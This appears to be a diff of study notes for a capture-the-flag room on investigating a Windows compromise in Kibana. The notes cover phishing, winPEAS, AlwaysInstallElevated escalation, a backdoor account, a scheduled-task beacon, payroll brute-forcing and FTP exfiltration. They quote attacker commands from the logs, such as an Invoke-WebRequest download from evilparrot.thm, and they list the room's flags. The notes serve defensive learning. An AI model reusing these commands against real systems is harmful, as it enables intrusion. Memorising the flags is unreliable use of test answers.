@@ -48,36 +48,43 @@ Answer: 920
 
 # Kibana: Fields and Values
 ![](PNG/Notes_PNG_5.png)
+
 Click on the available field name to reveal the top values for that field. In this example, clicking on *destination.ip* reveals the top values for the destination ip.
 
 This can be used to infer interesting patterns or trends in logs. For example, we can determine if an IP address stand out which could indicate potential use of a command-and-control (C2) server.
 
 #### Look at the **Top values** under the **destination.ip** field. Which IP address stands out?
 ![](PNG/Notes_PNG_6.png)
+
 This address's first octet is unusual compared to the rest.
 
 Answer: 84.237.252.156
 
 #### Use an IP address lookup tool (such as iplocation.io). What country does this IP address originate from?
 ![](PNG/Notes_PNG_7.png)
+
 Answer: Latvia
 
 #### Which **process name** is running the most frequently on the compromised workstation?
 ![](PNG/Notes_PNG_8.png)
+
 Answer: curl.exe
 
 # Kibana: Sorting and Filtering
 ![](PNG/Notes_PNG_9.png)
 ![](PNG/Notes_PNG_10.png)
+
 This filters only shows log events containing a value in the specified field. In this case, it allows us to only see log events that contain information about the specific commands that were run.
 
 ![](PNG/Notes_PNG_11.png)
 ![](PNG/Notes_PNG_12.png)
 ![](PNG/Notes_PNG_13.png)
+
 By applying these two filters, we can see that the results have narrowed down to 72 and the *agent.name* and *related.user* field are both highlighted with the filter we selected.
 
 ![](PNG/Notes_PNG_14.png)
 ![](PNG/Notes_PNG_15.png)
+
 From observing *process.command_line* and the file path, we can see that Bill downloaded a PowerShell script that was disguised as a PDF invoice from the phishing email he received. We can determine that this is a PowerShell script from the ".ps1" file extension.
 
 This type of attack is known as *file extension spoofing* to disguise malicious files as harmless documents to trick users into downloading and executing them,
@@ -86,19 +93,24 @@ Answer: 6712
 
 #### What was the **parent process name** of the process that spawned powershell.exe?
 ![](PNG/Notes_PNG_16.png)
+
 Answer: explorer.exe
 
 # Indicators of Compromise: Discovery
 In the context of MITRE ATT&CK, **Discovery** the adversaries use techniques and methods to gather information about the target environment.
-![](PNG/Notes_PNG_17.png)Scrolling down the logs further, we can observe there are other commands being run. Since this is likely suspicious activity with the PowerShell script, these logs appear as Indicators of Compromise (IOCs).
+![](PNG/Notes_PNG_17.png)
+
+Scrolling down the logs further, we can observe there are other commands being run. Since this is likely suspicious activity with the PowerShell script, these logs appear as Indicators of Compromise (IOCs).
 
 This is common in the "enumeration phase" of an attack on an internal network.
 
 ![](PNG/Notes_PNG_18.png)
+
 Moving down the logs, we can also observe a suspicious PowerShell cmdlet `powershell -c Invoke-WebRequest`.
 - The *Invoke-WebRequest* cmdlet is used to retrieve data from a web server and can be used to download files, interact with REST APIs, and perform other HTTP/HTTPS operations.
 
 ![](PNG/Notes_PNG_19.png)
+
 Further investigation into this log, the entire command is:
 `powershell -c Invoke-WebRequest -Uri "http://evilparrot.thm/winPEASany.exe" -OutFile "winPEAS.exe"`
 
@@ -106,6 +118,7 @@ From this command, it appears that the attacker used the *Invoke-WebRequest* cmd
 - winPEAS is a script that searches for possible paths to escalate privileges on Windows hosts.
 
 ![](PNG/Notes_PNG_20.png)![](PNG/Notes_PNG_21.png)
+
 After running winPEAS.exe, it appears the attacker found a potential path to escalate privileges and made some queries into the Windows registry to validate using *reg query*. The attacker is specifically looking for a registry with the **AlwaysInstalledElevated** entry set, and this entry allows users to install programs or updates on the system with elevated privileges.
 
 #### What is the domain name of the attacker's server hosting the **winPEAS** executable?
@@ -121,12 +134,15 @@ The **AlwaysInstallElevated** privilege escalation technique is a common exploit
 
 We can use **KQL** (Kibana Query Language) to directly search for fields, values, or patterns in the data.
 ![](PNG/Notes_PNG_22.png).
+
 Here, we are searching for any logs in the **process.command_line** field containing "msi".
 
 ![](PNG/Notes_PNG_23.png)
+
 The first result is the **Invoke-WebRequest** cmdlet to download the malicious MSI file. The second log seems to execute the malicious file using **msiexec.exe**.
 
 ![](PNG/Notes_PNG_24.png)
+
 Validated. Executing **adminshell.msi** likely gave the attacker an **elevated shell** on the compromised workstation.
 
 #### What is the name of the malicious **.msi** file?
@@ -137,10 +153,12 @@ In the context of MITRE ATT&CK, **Persistence** is a tactic used by adversaries 
 - Typically involves establishing a **foothold** or a **backdoor** on the system.
 
 ![](PNG/Notes_PNG_25.png)
+
 We are switching the **related.user** field from **bsmith** to **SYSTEM** since processes that run with elevated privileges are typically in the context of the "SYSTEM" user account.
 
 ![](PNG/Notes_PNG_26.png)
 ![](PNG/Notes_PNG_27.png)
+
 From these two screenshots, we can observe that there is a small spike of activity at **18:54:00** which is around the time of the attack.
 
 We can observe that there are some suspicious commands executed around **18:54:04**. The command **net user** was used to create a backdoor account with password set to never expire and password changes disabled.
@@ -150,22 +168,27 @@ Then the command **net localgroup** was used to add the newly created backdoor a
 `net localgroup Administrators`
 
 ![](PNG/Notes_PNG_28.png)
+
 Remove the **related.user** filter and change back the date and time range to the original reported attack time range.
 
 ![](PNG/Notes_PNG_29.png)
 ![](PNG/Notes_PNG_30.png)
+
 Once again, we observe the **Invoke-WebRequest** cmdlet to download a file named beacon.bat from the evilparrot.thm server. The name "**beacon**" may refer to a C2 technique used by attackers to maintain persistence.
 - A beacon may periodically send singles or pings to a C2 server.
 
 ![](PNG/Notes_PNG_31.png)
+
 Reverting back to the old timeline and now digging further into the next time block.
 
 ![](PNG/Notes_PNG_32.png)
+
 From the log results, we can see that the attacker used the **schtasks** command to create a new automated task called "Beacon," that runs the beacon.bat every minute as the System user.
 - The **schtasks** command is typically used to maintain persistence on a compromised system by running a malicious script or executable at specific intervals.
 - This also ensures that the attacker's backdoor automatically runs in the event that the system reboots.
 
 ![](PNG/Notes_PNG_33.png)
+
 The last persistence method can be observed where the attacker added an entry to the Windows registry using the **reg add** command. This command adds a new entry to the "**Run**" key that will cause the adminshell.msi to automatically execute each time Bill logs in.
 
 #### What is the **name** of the **user account** that the attacker created to maintain privileged access?
@@ -173,6 +196,7 @@ Answer: backdoor
 
 #### What is the flag sent via **cURL** requests to the **evilparrot.thm** server?
 ![](PNG/Notes_PNG_34.png)
+
 Answer: THM{C4N_y0U_h34r_m3}
 
 #### What is the **name** of the registry value that the attacker added?
@@ -181,31 +205,39 @@ Answer: BackdoorShell
 # Indicators of Compromise: Lateral Movement
 In the context of MITRE ATT&CK, **Lateral Movement** refers to techniques and methods used by adversaries to pivot through multiple systems and explore the network.
 ![](PNG/Notes_PNG_35.png)
+
 Using the same filter from previous section, we can observe that the attacker is testing to see if they can reach the **payoll.servidae.internal** website. This does not necessarily indicate lateral movement, but it indicates that the attacker is attempting to test connectivity to other internal resources.
 
 ![](PNG/Notes_PNG_36.png)
+
 Changing this timeline will let us see the remaining logs.
 
 ![](PNG/Notes_PNG_37.png)
+
 After updating the timeline, we can observe several logs attempting to make **cURL** requests to the **payroll.servidae.internal** website.
 
 ![](PNG/Notes_PNG_38.png)
+
 Apply filter to remove unnecessary repeating logs.
 
 ![](PNG/Notes_PNG_39.png)
+
 From these logs results, we can observe the attacker conducting a **brute-force login attack** as each log event shows the attacker incrementing password attempts (password=Pass1, password=Pass2, password=Pass3, etc.).
 
 ![](PNG/Notes_PNG_41.png)
 ![](PNG/Notes_PNG_43.png)
+
 Filtering using PHPSESSID in KQL shows successful login attempts. These logs show the attacker accessing the **/employee-payroll.php** webpage.
 
 ![](PNG/Notes_PNG_42.png)
+
 Using the KQL Query:
 `process.name: "curl.exe" AND NOT process.command_line: *beacon* AND process.command_line: *http\://payroll.servidae.internal/*`
 This query also searches for log events where the attacker accessed a directory under the web server's root.
 This result shows that the attacker downloaded a potentially **sensitive CSV file** after gaining access into the payroll server.
 
 ![](PNG/Notes_PNG_44.png)
+
 Investigating this further chronologically, we can observe that after downloading the CSV file, the attacker used the **FTP** command likely to exfiltrate and transfer the stolen document back over to the attacker's system.
 
 ## Mitigation
@@ -213,18 +245,22 @@ To mitigate against the attacker's ability to move around the network, defense c
 
 #### What was the **password** that the attacker used to access Bill's user account on the internal payroll website?
 ![](PNG/Notes_PNG_45.png)
+
 Answer: Password123!
 
 #### What **flag** was included within the **HTTP requests** during the attacker's successful logins?
 ![](PNG/Notes_PNG_46.png)
+
 Answer: THM{1m_1N_Y0ur_P4YR0LL}
 
 #### What was the session cookie value that the attacker included in the cURL request at 18:58:08.001?
 ![](PNG/Notes_PNG_47.png)
+
 Answer: dt5qhq423goknmq269rg1tal1a
 
 #### What is the name of the sensitive file that the attacker downloaded?
 ![](PNG/Notes_PNG_48.png)
+
 Answer: bank-details.csv
 
 # Lesson Learned
